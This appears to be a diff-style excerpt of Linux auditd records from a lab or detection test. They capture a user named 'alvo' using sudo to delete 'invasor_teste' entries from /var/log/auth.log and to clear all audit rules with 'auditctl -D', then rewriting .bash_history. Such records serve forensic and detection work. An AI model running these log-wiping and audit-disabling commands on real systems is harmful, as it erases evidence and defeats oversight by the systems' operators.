+type=PROCTITLE msg=audit(12/11/2026 01:41:01.707:54304) : proctitle=sudo sed -i /invasor_teste/d /var/log/auth.log 
+type=PATH msg=audit(12/11/2026 01:41:01.707:54304) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:41:01.707:54304) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:41:01.707:54304) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x55bf95a63f40 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=125048 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:41:17.893:54328) : proctitle=sudo auditctl -D 
+type=PATH msg=audit(12/11/2026 01:41:17.893:54328) : item=0 name=/home/alvo/.sudo_as_admin_successful inode=783729 dev=08:01 mode=file,644 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:41:17.893:54328) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:41:17.893:54328) : arch=x86_64 syscall=openat success=no exit=EEXIST(Arquivo existe) a0=AT_FDCWD a1=0x5563bc89ff00 a2=O_WRONLY|O_CREAT|O_EXCL|O_NONBLOCK a3=0x1a4 items=1 ppid=124803 pid=125054 auid=alvo uid=alvo gid=alvo euid=alvo suid=root fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=sudo exe=/usr/bin/sudo subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:41:46.279:54338) : proctitle=-bash 
+type=PATH msg=audit(12/11/2026 01:41:46.279:54338) : item=1 name=/home/alvo/.bash_history inode=783998 dev=08:01 mode=file,600 ouid=alvo ogid=alvo rdev=00:00 nametype=CREATE cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=PATH msg=audit(12/11/2026 01:41:46.279:54338) : item=0 name=/home/alvo/ inode=783716 dev=08:01 mode=dir,700 ouid=alvo ogid=alvo rdev=00:00 nametype=PARENT cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:41:46.279:54338) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:41:46.279:54338) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x55fa16f81020 a2=O_WRONLY|O_CREAT|O_TRUNC a3=0x180 items=2 ppid=124802 pid=124803 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=bash exe=/usr/bin/bash subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:41:58.159:54346) : proctitle=-bash 
+type=PATH msg=audit(12/11/2026 01:41:58.159:54346) : item=0 name=/home/alvo/.bash_history inode=783998 dev=08:01 mode=file,600 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:41:58.159:54346) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:41:58.159:54346) : arch=x86_64 syscall=openat success=yes exit=3 a0=AT_FDCWD a1=0x55fa170035f0 a2=O_WRONLY|O_APPEND a3=0x0 items=1 ppid=124802 pid=124803 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=bash exe=/usr/bin/bash subj=unconfined key=alteracao_home 
+----
+type=PROCTITLE msg=audit(12/11/2026 01:41:58.159:54347) : proctitle=-bash 
+type=PATH msg=audit(12/11/2026 01:41:58.159:54347) : item=0 name=/home/alvo/.bash_history inode=783998 dev=08:01 mode=file,600 ouid=alvo ogid=alvo rdev=00:00 nametype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 cap_frootid=0 
+type=CWD msg=audit(12/11/2026 01:41:58.159:54347) : cwd=/home/alvo 
+type=SYSCALL msg=audit(12/11/2026 01:41:58.159:54347) : arch=x86_64 syscall=chown success=yes exit=0 a0=0x55fa170035f0 a1=alvo a2=0x3e9 a3=0x0 items=1 ppid=124802 pid=124803 auid=alvo uid=alvo gid=alvo euid=alvo suid=alvo fsuid=alvo egid=alvo sgid=alvo fsgid=alvo tty=pts3 ses=9 comm=bash exe=/usr/bin/bash subj=unconfined key=alteracao_home 
